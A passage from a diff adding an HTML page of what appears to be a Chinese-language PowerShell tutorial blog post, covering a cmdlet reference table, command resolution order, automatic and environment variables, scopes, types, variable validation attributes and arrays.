+<td>Sort-Object</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113403">help</a></td>
+</tr>
+<tr>
+<td>Split-Path</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113404">help</a></td>
+</tr>
+<tr>
+<td>Start-Job</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113405">help</a></td>
+</tr>
+<tr>
+<td>Start-Process</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135261">help</a></td>
+</tr>
+<tr>
+<td>Start-Service</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113406">help</a></td>
+</tr>
+<tr>
+<td>Start-Sleep</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113407">help</a></td>
+</tr>
+<tr>
+<td>Start-Transaction</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135262">help</a></td>
+</tr>
+<tr>
+<td>Start-Transcript</td>
+<td>Microsoft.PowerShell.Host</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113408">help</a></td>
+</tr>
+<tr>
+<td>Stop-Computer</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135263">help</a></td>
+</tr>
+<tr>
+<td>Stop-Job</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113413">help</a></td>
+</tr>
+<tr>
+<td>Stop-Process</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113412">help</a></td>
+</tr>
+<tr>
+<td>Stop-Service</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113414">help</a></td>
+</tr>
+<tr>
+<td>Stop-Transcript</td>
+<td>Microsoft.PowerShell.Host</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113415">help</a></td>
+</tr>
+<tr>
+<td>Suspend-Service</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113416">help</a></td>
+</tr>
+<tr>
+<td>Tee-Object</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113417">help</a></td>
+</tr>
+<tr>
+<td>Test-ComputerSecureChannel</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=137749">help</a></td>
+</tr>
+<tr>
+<td>Test-Connection</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135266">help</a></td>
+</tr>
+<tr>
+<td>Test-ModuleManifest</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=141557">help</a></td>
+</tr>
+<tr>
+<td>Test-Path</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113418">help</a></td>
+</tr>
+<tr>
+<td>Test-WSMan</td>
+<td>Microsoft.WSMan.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkId=141464">help</a></td>
+</tr>
+<tr>
+<td>Trace-Command</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113419">help</a></td>
+</tr>
+<tr>
+<td>Undo-Transaction</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135268">help</a></td>
+</tr>
+<tr>
+<td>Unregister-Event</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135269">help</a></td>
+</tr>
+<tr>
+<td>Unregister-PSSessionConfiguration</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=144308">help</a></td>
+</tr>
+<tr>
+<td>Update-FormatData</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113420">help</a></td>
+</tr>
+<tr>
+<td>Update-List</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113447">help</a></td>
+</tr>
+<tr>
+<td>Update-TypeData</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113421">help</a></td>
+</tr>
+<tr>
+<td>Use-Transaction</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135271">help</a></td>
+</tr>
+<tr>
+<td>Wait-Event</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135276">help</a></td>
+</tr>
+<tr>
+<td>Wait-Job</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113422">help</a></td>
+</tr>
+<tr>
+<td>Wait-Process</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135277">help</a></td>
+</tr>
+<tr>
+<td>Where-Object</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113423">help</a></td>
+</tr>
+<tr>
+<td>Write-Debug</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113424">help</a></td>
+</tr>
+<tr>
+<td>Write-Error</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113425">help</a></td>
+</tr>
+<tr>
+<td>Write-EventLog</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135281">help</a></td>
+</tr>
+<tr>
+<td>Write-Host</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113426">help</a></td>
+</tr>
+<tr>
+<td>Write-Output</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113427">help</a></td>
+</tr>
+<tr>
+<td>Write-Progress</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113428">help</a></td>
+</tr>
+<tr>
+<td>Write-Verbose</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113429">help</a></td>
+</tr>
+<tr>
+<td>Write-Warning</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113430">help</a></td>
+</tr>
+</tbody></table>
+<h3 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h3><p>可以通过函数扩展别名</p>
+<h3 id="调用入口优先级"><a href="#调用入口优先级" class="headerlink" title="调用入口优先级"></a>调用入口优先级</h3><p><strong>别名</strong>：控制台首先会寻找输入是否为一个别名，如果是，执行别名所指的命令。因此我们可以通过别名覆盖任意powershell命令，因为别名的优先级最高。</p>
+<p><strong>函数</strong>：如果没有找到别名，会继续寻找函数，函数类似别名，只不过它包含了更多的powershell命令。因此可以自定义函数扩充cmdlet 把常用的参数给固化进去。</p>
+<p><strong>命令</strong>：如果没有找到函数，控制台会继续寻找命令，即cmdlet，powershell的内部命令。</p>
+<p><strong>脚本</strong>：没有找到命令，继续寻找扩展名为“.ps1”的Powershell脚本。</p>
+<p><strong>文件</strong>：没有找到脚本，会继续寻找文件，如果没有可用的文件，控制台会抛出异常</p>
+<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="变量操作"><a href="#变量操作" class="headerlink" title="变量操作"></a>变量操作</h3><p>不必声明，可以直接使用。前缀为<code>$</code>，大小写不敏感。一些特殊字符如果用作变量名应用花括号括起来。</p>
+<p>可以连续赋值，也可以使用元祖赋值，比如<code>$a,$b=$b,$a</code>。</p>
+<p>变量的相关信息被记录在variable驱动中，可以通过遍历variable:得到。<code>ls variable:</code>，还可以像查找文件一样使用通配符查找变量，例如查找value开头的变量。<code>ls variable:value*</code>。</p>
+<p>验证变量是否存在，可以像验证文件系统一样使用cmdlet Test-Path，因为变量存在变量驱动器中。<code>Test-Path variable:value1</code></p>
+<p>Powershell退出时自动删除变量，也可以手动删除。<code>del variable:value1</code></p>
+<p>有五个专用的管理变量cmdlet，Clear-Variable,Get-Variable,New-Variable,Remove-Variable,Set-Variable。其中Get-Variable,New-Variable，可以获得或者指定一些变量的属性。New-Variable的-option可以加上readonly或者constant属性，也可以用-description添加描述，但是默认不显示，可以通过Format-List查看。<code>new-variable name -Value &quot;me&quot; -description &quot;this is my name&quot; -option readonly</code>。</p>
+<h3 id="自动化变量"><a href="#自动化变量" class="headerlink" title="自动化变量"></a>自动化变量</h3><p>指打开powershell时自动加载的变量，一般包括用户信息，配置信息，运行时信息等。</p>
+<p>某些自动化变量是只读的。列表：</p>
+<p><strong>$$</strong><br>包含会话所收到的最后一行中的最后一个令牌。</p>
+<p><strong>$?</strong><br>包含最后一个操作的执行状态。如果最后一个操作成功，则包含 TRUE，失败则包含 FALSE。</p>
+<p><strong>$^</strong><br>包含会话所收到的最后一行中的第一个令牌。</p>
+<p><strong>$_</strong><br>包含管道对象中的当前对象。在对管道中的每个对象或所选对象执行操作的命令中，可以使用此变量。</p>
+<p><strong>$Args</strong><br>包含由未声明参数和/或传递给函数、脚本或脚本块的参数值组成的数组。<br>在创建函数时可以声明参数，方法是使用 param 关键字或在函数名称后添加以圆括号括起、逗号<br>分隔的参数列表。</p>
+<p><strong>$ConsoleFileName</strong><br>包含在会话中最近使用的控制台文件 (.psc1) 的路径。在通过 PSConsoleFile 参数启动<br>Windows PowerShell 或使用 Export-Console cmdlet 将管理单元名称导出到控制台文件<br>时，将填充此变量。</p>
+<p>在使用不带参数的 Export-Console cmdlet 时，它自动更新在会话中最近使用的控制台文件。<br>可以使用此自动变量确定要更新的文件。</p>
+<p><strong>$Error</strong><br>包含错误对象的数组，这些对象表示最近的一些错误。最近的错误是该数组中的第一个错误对象<br>($Error[0])。</p>
+<p><strong>$Event</strong><br>包含一个 PSEventArgs 对象，该对象表示一个正在被处理的事件。<br>此变量只在事件注册命令（例如 Register-ObjectEvent）的 Action 块内填充。<br>此变量的值是 Get-Event cmdlet 返回的同一个对象。<br>因此，可以在 Action 脚本块中使用 $Event 变量的属性（例如<br>$Event.TimeGenerated）。</p>
+<p><strong>$EventSubscriber</strong><br>包含一个 PSEventSubscriber 对象，该对象表示正在被处理的事件的事件订阅者。<br>此变量只在事件注册命令的 Action 块内填充。此变量的值<br>是 Get-EventSubscriber cmdlet 返回的同一个对象。</p>
+<p><strong>$ExecutionContext</strong><br>包含一个 EngineIntrinsics 对象，该对象表示 Windows PowerShell 主机的执行上下文。<br>可以使用此变量来查找可用于 cmdlet 的执行对象。</p>
+<p><strong>$False</strong><br>包含 FALSE。可以使用此变量在命令和脚本中表示 FALSE，而不是使用字符串”false”。如果<br>该字符串转换为非空字符串或非零整数，则可将该字符串解释为 TRUE。</p>
+<p><strong>$ForEach</strong><br>包含 ForEach-Object 循环的枚举数。可以对 $ForEach 变量的值使用枚举数的属性和方法。<br>此变量仅在运行 For 循环时存在，循环完成即会删除。</p>
+<p><strong>$Home</strong><br>包含用户的主目录的完整路径。此变量等效于 %homedrive%%homepath% 环境变量。</p>
+<p><strong>$Host</strong><br>包含一个对象，该对象表示 Windows PowerShell 的当前主机应用程序。可以使用此变量在命<br>令中表示当前主机，或者显示或更改主机的属性，如 $Host.version、$Host.CurrentCulture<br>或 $host.ui.rawui.setbackgroundcolor(“Red”)。</p>
+<p><strong>$Input</strong><br>一个枚举数，它包含传递给函数的输入。$Input 变量区分大小写，只能用于函数和脚本块。（脚<br>本块本质上是未命名的函数。）在函数的 Process 块中，$Input 变量包含当前位于管道中的对<br>象。在 Process 块完成后，$Input 的值为 NULL。如果函数没有 Process 块，则 $Input<br>的值可用于 End 块，它包含函数的所有输入。</p>
+<p><strong>$LastExitCode</strong><br>包含运行的最后一个基于 Windows 的程序的退出代码。</p>
+<p><strong>$Matches</strong><br>$Matches 变量与 -match 和 -not match 运算符一起使用。<br>将标量输入提交给 -match 或 -notmatch 运算符时，如果检测到匹配，则会返回一个布尔值，<br>并使用由所有匹配字符串值组成的哈希表填充 $Matches 自动变量。有关 -match 运算符的详细<br>信息，请参阅 about_comparison_operators。</p>
+<p><strong>$MyInvocation</strong><br>包含一个对象，该对象具有有关当前命令（如脚本、函数或脚本块）的信息。可以使用该对象中的<br>信息（如脚本的路径和文件名 ($myinvocation.mycommand.path) 或函数的名称<br>($myinvocation.mycommand.name)）来标识当前命令。对于查找正在运行的脚本的名称，这非常有用。</p>
+<p><strong>$NestedPromptLevel</strong><br>包含当前提示级别。值 0 指示原始提示级别。该值在进入嵌套级别时递增，在退出嵌套级别时递减。</p>
+<p>例如，在使用 $Host.EnterNestedPrompt 方法时，Windows PowerShell 会出现嵌套命令<br>提示符。在 Windows PowerShell 调试程序中到达断点时，Windows PowerShell 也会出现嵌<br>套命令提示符。</p>
+<p>在进入嵌套提示时，Windows PowerShell 暂停当前命令，保存执行上下文，并递增<br>$NestedPromptLevel 变量的值。要创建更多嵌套命令提示符（最多 128 级）或返回到原始命<br>令提示符，请完成命令，或键入”exit”。</p>
+<p>$NestedPromptLevel 变量有助于跟踪提示级别。可以创建包含此值的备用 Windows<br>PowerShell 命令提示符，以使此值始终可见。</p>
+<p><strong>$NULL</strong><br>包含 NULL 或空值。可以在命令和脚本中使用此变量表示 NULL，而不是使用字符串”NULL”。<br>如果该字符串转换为非空字符串或非零整数，则可将该字符串解释为 TRUE。</p>
+<p><strong>$PID</strong><br>包含承载当前 Windows PowerShell 会话的进程的进程标识符 (PID)。</p>
+<p>$Profile<br>包含当前用户和当前主机应用程序的 Windows PowerShell 配置文件的完整路径。可以在命令<br>中使用此变量表示配置文件。例如，可以在命令中使用此变量确定是否已创建某个配置文件：</p>
+<p>test-path $profile</p>
+<p>也可以在命令中使用此变量创建配置文件：</p>
+<p>new-item -type file -path $pshome -force</p>
+<p>此外，还可以在命令中使用此变量在记事本中打开配置文件：</p>
+<p>notepad $profile</p>
+<p>$PSBoundParameters<br>包含活动参数及其当前值的字典。只有在声明参数的作用域（如脚本或函数）中，<br>此变量才有值。可以使用此变量显示或更改参数的当前值，也可以将参数值传递给<br>其他脚本或函数。</p>
+<p>例如：</p>
+<p>function test {<br>param($a, $b)</p>
+<p># Display the parameters in dictionary format.<br>$psboundparameters</p>
+<p># Call the Test1 function with $a and $b.<br>test1 @psboundparameters<br>**}**</p>
+<p><strong>$PsCmdlet</strong><br>包含一个对象，该对象表示正在运行的 cmdlet 或高级函数。</p>
+<p>可以在 cmdlet 或函数代码中使用该对象的属性和方法来响应使用的条件。例如，<br>ParameterSetName 属性包含正在使用的参数集的名称，而 ShouldProcess 方法将 WhatIf<br>和 Confirm 参数动态添加到 cmdlet。</p>
+<p>有关 $PSCmdlet 自动变量的详细信息，请参阅 about_Functions_Advanced。</p>
+<p><strong>$PsCulture</strong><br>包含操作系统中当前所用的区域性的名称。区域性确定数字、货币和日期等项的显示格式。这是系<br>统的 System.Globalization.CultureInfo.CurrentCulture.Name 属性的值。要获取系统<br>的 System.Globalization.CultureInfo 对象，请使用 Get-Culture cmdlet。</p>
+<p><strong>$PSDebugContext</strong><br>在调试期间，此变量包含有关调试环境的信息。在其他时间，此变量包含 NULL 值。因此，可以使<br>用此变量指示调试程序是否拥有控制权。填充之后，此变量包含一个具有 Breakpoints 和<br>InvocationInfo 属性的 PsDebugContext 对象。InvocationInfo 属性有多个十分有用的<br>属性，包括 Location 属性。Location 属性指示正在调试的脚本的路径。</p>
+<p><strong>$PsHome</strong><br>包含 Windows PowerShell 的安装目录的完整路径（通常为<br>%windir%System32WindowsPowerShellv1.0）。可以在 Windows PowerShell 文件<br>的路径中使用此变量。例如，下面的命令在概念性帮助主题中搜索”variable”一词：</p>
+<p>select-string -pattern variable -path $pshome*.txt</p>
+<p><strong>$PSScriptRoot</strong><br>包含要从中执行脚本模块的目录。<br>通过此变量，脚本可以使用模块路径来访问其他资源。</p>
+<p><strong>$PsUICulture</strong><br>包含操作系统中当前所用的用户界面 (UI) 区域性的名称。UI 区域性确定哪些文本字符串用于用户<br>界面元素（如菜单和消息）。这是系统的<br>System.Globalization.CultureInfo.CurrentUICulture.Name 属性的值。要获取系统<br>的 System.Globalization.CultureInfo 对象，请使用 Get-UICulture cmdlet。</p>
+<p><strong>$PsVersionTable</strong><br>包含一个只读哈希表，该哈希表显示有关在当前会话中运行的 Windows PowerShell 版本的详<br>细信息。<br>该表包括下列项：</p>
+<ul>
+<li>CLRVersion： 公共语言运行时 (CLR) 的版本</li>
+<li>BuildVersion： 当前版本的内部版本号</li>
+<li>PSVersion： Windows PowerShell 版本号</li>
+<li>WSManStackVersion： WS-Management 堆栈的版本号</li>
+<li>PSCompatibleVersions： 与当前版本兼容的 Windows PowerShell 版本</li>
+<li>SerializationVersion ：序列化方法的版本</li>
+<li>PSRemotingProtocolVersion：Windows PowerShell 远程管理协议的版本</li>
+</ul>
+<p><strong>$Pwd</strong><br>包含一个路径对象，该对象表示当前目录的完整路径。</p>
+<p><strong>$Sender</strong><br>包含生成此事件的对象。此变量只在事件注册命令的 Action 块内填充。<br>此变量的值也可在 Get-Event 返回的 PSEventArgs<br>(System.Management.Automation.PSEventArgs) 对象的 Sender 属性中找到。</p>
+<p><strong>$ShellID</strong><br>包含当前 shell 的标识符。</p>
+<p><strong>$SourceArgs</strong><br>包含表示正在被处理的事件的事件参数的对象。此变量只在事件注册命令的 Action<br>块内填充。此变量的值也可在 Get-Event 返回的 PSEventArgs<br>(System.Management.Automation.PSEventArgs) 对象的 SourceArgs 属性中找到。</p>
+<p><strong>$SourceEventArgs</strong><br>包含一个对象，该对象表示从正在被处理的事件的 EventArgs 中派生出的<br>第一个事件参数。此变量只在事件注册命令的 Action 块内填充。<br>此变量的值也可在 Get-Event 返回的 PSEventArgs<br>(System.Management.Automation.PSEventArgs) 对象的 SourceArgs 属性中找到。</p>
+<p><strong>$This</strong><br>在定义脚本属性或脚本方法的脚本块中，$This 变量引用要扩展的对象。</p>
+<p><strong>$True</strong><br>包含 TRUE。可以在命令和脚本中使用此变量表示 TRUE。</p>
+<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>环境变量保存在env:虚拟驱动中，可以使用<code>$env:windir</code>这种形式访问其中的环境变量。</p>
+<p>Powershell中的环境变量是机器环境变量的副本，下次打开会恢复，如果想持久生效，需要使用.NET方法。<code>[environment]::SetEnvironmentvariable(&quot;Path&quot;,&quot;;C://powershellscript&quot;,&quot;user&quot;)</code>，<code>[encironment]::GetEnvironmentvariable(&quot;Path&quot;,&quot;User&quot;)</code>。</p>
+<h3 id="驱动器变量"><a href="#驱动器变量" class="headerlink" title="驱动器变量"></a>驱动器变量</h3><table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Root</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A</td>
+<td>A:</td>
+<td></td>
+</tr>
+<tr>
+<td>Alias</td>
+<td></td>
+<td>Drive containing a view of the aliases stored in session state.</td>
+</tr>
+<tr>
+<td>C</td>
+<td>C:</td>
+<td></td>
+</tr>
+<tr>
+<td>cert</td>
+<td></td>
+<td>X509 Certificate Provider</td>
+</tr>
+<tr>
+<td>E</td>
+<td>E:</td>
+<td></td>
+</tr>
+<tr>
+<td>Env</td>
+<td></td>
+<td>The drive containing a view of the environment variables for the process.</td>
+</tr>
+<tr>
+<td>Function</td>
+<td></td>
+<td>The drive containing a view of the functions stored in session state.</td>
+</tr>
+<tr>
+<td>HKCU</td>
+<td>HKEY_CURRENT_USER</td>
+<td>The software settings for the current user.</td>
+</tr>
+<tr>
+<td>HKLM</td>
+<td>HKEY_LOCAL_MACHINE</td>
+<td>The configuration settings for the local machine.</td>
+</tr>
+<tr>
+<td>Variable</td>
+<td></td>
+<td>The drive containing a view of those variables stored in session state.</td>
+</tr>
+<tr>
+<td>WSMan</td>
+<td></td>
+<td>Root of WsMan Config Storage.</td>
+</tr>
+</tbody></table>
+<h3 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h3><table>
+<thead>
+<tr>
+<th>作用域</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$global</td>
+<td>全局变量，在所有作用域中有效</td>
+</tr>
+<tr>
+<td>$script</td>
+<td>脚本变量，脚本内部有效，包括脚本中的函数</td>
+</tr>
+<tr>
+<td>$private</td>
+<td>只在当前作用域中有效，不能贯穿到其他作用域</td>
+</tr>
+<tr>
+<td>$local</td>
+<td>默认变量，可以省略修饰符，在当前作用域有效，其他作用域只读</td>
+</tr>
+</tbody></table>
+<p>如果不做特殊声明，解释器会自动处理和限制变量的作用域。如果在运行脚本时前面加上点和空格（<code>. .\test.ps1</code>），这个脚本就会共享当前控制台的作用域，但是可能存在问题。</p>
+<p><code>$private:var=&quot;I am a private variable&quot;</code></p>
+<h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><p>powershell本身是弱类型的，但可以使用<code>[type]$k=&quot;v&quot;</code>的方式指定类型，每个特殊的数据类型都有自己的特殊命令和方法。默认支持的.NET类型如下：</p>
+<p>[array],[bool],[byte],[char],[datetime],[decimal],[double],[guid],[hashtable],[int16],[int32],[int],[int64],[long],[nullable],[psobject],[regex],[sbyte].[scriptblock],[single],[float],[string],[switch],[timespan],[type],[uint16],[uint32],[uint64],[ XML ]</p>
+<p>使用<code>[int[]]$nums=@()</code>的形式可以定义强类型数组</p>
+<h3 id="变量的幕后管理"><a href="#变量的幕后管理" class="headerlink" title="变量的幕后管理"></a>变量的幕后管理</h3><p>创建变量同时会在后台生成一个PSVariable对象，包含变量的信息。<code>Get-Variable a | fl *</code>可以得到变量的全部信息。</p>
+<p>更新变量的选项设置，可以使用Set-Variable，也可以获取PSvariable对象后更改，比如：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;I am a variable&quot;</span></span><br><span class="line"><span class="variable">$var</span> = <span class="built_in">Get-Variable</span> str</span><br><span class="line"><span class="variable">$var</span></span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">Name		Value</span></span><br><span class="line"><span class="comment">----		-----</span></span><br><span class="line"><span class="comment">str			I am a variable</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"><span class="variable">$var</span> | <span class="built_in">fl</span> *</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">Name		: str</span></span><br><span class="line"><span class="comment">Description	: </span></span><br><span class="line"><span class="comment">Value		: I am a variable</span></span><br><span class="line"><span class="comment">Visibility	: Public</span></span><br><span class="line"><span class="comment">Module		:</span></span><br><span class="line"><span class="comment">ModuleName	:</span></span><br><span class="line"><span class="comment">Options		: None</span></span><br><span class="line"><span class="comment">Attributes	: &#123;&#125;</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"><span class="variable">$var</span>.Description = <span class="string">&quot;I know that&quot;</span></span><br><span class="line"><span class="comment"># 如果不想使用$var</span></span><br><span class="line">(<span class="built_in">Get-Variable</span> str).Description = <span class="string">&quot;changed&quot;</span></span><br><span class="line"><span class="comment"># 改变选项</span></span><br><span class="line"><span class="built_in">Set-Variable</span> str <span class="literal">-Option</span> <span class="string">&quot;ReadOnly&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>选项设置是一个枚举值，包括：</p>
+<ul>
+<li>None ，默认设置</li>
+<li>ReadOnly ，只读，可以通过 -Force选项更新</li>
+<li>Constant ，常量，一旦声明在当前控制台无法更新</li>
+<li>Private ，只在当前作用域可见，不能贯穿</li>
+<li>AllScope ，全局，可以贯穿</li>
+</ul>
+<p>每个变量都有自己具体的类型，存放在PSvariable对象的Attributes[System.Management.Automation.PSVariableAttributeCollection]属性，如果这个Attributes为空，可以存储任何类型的数据，一旦Attributes固定，就不能随意存放数据。可以使用<code>(Get-Variable var).Attributes.Clear()</code>清空。</p>
+<p>PSVariable对象的Attributes属性可以存储一些附加条件，比如限制长度：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$var</span> = <span class="string">&quot;限制变量&quot;</span></span><br><span class="line"><span class="variable">$condition</span> = <span class="built_in">New-Object</span> System.Management.Automation.ValidateLengthAttribute <span class="literal">-ArgumentList</span> <span class="number">2</span>,<span class="number">5</span> <span class="comment">#限制长度2-5</span></span><br><span class="line"><span class="variable">$var</span> = <span class="string">&quot;新射雕英雄传&quot;</span></span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">The variable connot be validatd because the value 新射雕英雄传 is not a valid value for the var variable</span></span><br><span class="line"><span class="comment">At line:1 char:5</span></span><br><span class="line"><span class="comment">+ $var &lt;&lt;&lt;&lt; =&quot;看射雕英雄传&quot;</span></span><br><span class="line"><span class="comment">    + CategoryInfo          : MetadataError: (:) [], ValidationMetadataException</span></span><br><span class="line"><span class="comment">    + FullyQualifiedErrorId : ValidateSetFailure</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>常用的变量内容验证还有5种，分别为：<br><strong>ValidateNotNullAttribute</strong>：限制变量不能为空<br><strong>ValidateNotNullOrEmptyAttribute</strong>：限制变量不等为空，不能为空字符串，不能为空集合<br><strong>ValidatePatternAttribute</strong>:限制变量要满足制定的正则表达式<br><strong>ValidateRangeAttribute</strong>：限制变量的取值范围<br><strong>ValidateSetAttribute</strong>：限制变量的取值集合</p>
+<h2 id="数组和哈希表"><a href="#数组和哈希表" class="headerlink" title="数组和哈希表"></a>数组和哈希表</h2><h3 id="命令返回数组"><a href="#命令返回数组" class="headerlink" title="命令返回数组"></a>命令返回数组</h3><p>命令的执行结果保存到变量中时，powershell会把文本的每一行作为元素存为数组。如果命令返回多个值，也会被存储为数组。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span> = ipconfig</span><br><span class="line"><span class="variable">$ip</span> <span class="operator">-is</span> [<span class="built_in">array</span>] <span class="comment"># True</span></span><br><span class="line"><span class="string">&quot;abc&quot;</span> <span class="operator">-is</span> [<span class="built_in">array</span>] <span class="comment"># False</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;string&quot;</span></span><br><span class="line"><span class="variable">$str</span>.ToCharArray() <span class="operator">-is</span> [<span class="built_in">array</span>] <span class="comment"># True</span></span><br><span class="line"><span class="variable">$array</span>.Count <span class="comment"># 数组元素个数</span></span><br><span class="line"><span class="variable">$array</span>[<span class="type">x</span>] <span class="comment"># 查看下标为x的元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用管道进一步处理数组</span></span><br><span class="line">ipconfig | <span class="built_in">Select-String</span> <span class="string">&quot;IP&quot;</span></span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">Windows IP Configuration</span></span><br><span 